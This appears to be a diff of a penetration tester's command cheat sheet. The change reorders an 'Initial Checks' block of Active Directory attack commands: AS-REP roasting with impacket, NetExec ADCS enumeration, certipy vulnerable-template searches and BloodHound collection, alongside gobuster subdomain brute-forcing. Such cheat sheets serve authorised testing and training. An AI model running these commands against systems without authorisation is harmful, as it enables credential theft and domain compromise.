@@ -120,6 +120,15 @@ gobuster vhost --append-domain -u $DOM -k -r -t 30 --exclude-length 0 \
 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 
 # Exploitation
+## Initial Checks
+nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET'
+sudo ntpdate -u $TARGET
+impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -k -M adcs
+certipy-ad find -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -vulnerable -enabled -stdout | grep --color=never -E 'CA Name|Template Name|\[\+\]|Vuln|ESC'
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
+
 ## Create Custom Usernames
 username-anarchy --input-file usernames --select-format first,flast,f.last,first.last,firstlast > .tmp; cat .tmp | tee usernames; rm .tmp
 
@@ -130,18 +139,6 @@ cat passwords | sort -u | tee passwords
 ## Decompress Files
 tar -xzvf backup.tar.gz -C .
 unzip backup.zip -d .
-
-## Initial Checks
-sudo ntpdate -u $TARGET
-nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET'
-impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -k -M adcs
-certipy-ad find -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -vulnerable -enabled -stdout | grep --color=never -E 'CA Name|Template Name|\[\+\]|Vuln|ESC'
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
-bloodhound
-chromium http://127.0.0.1:8080
-MATCH (u:User) RETURN u
 
 ## Web
 [*] WordPress
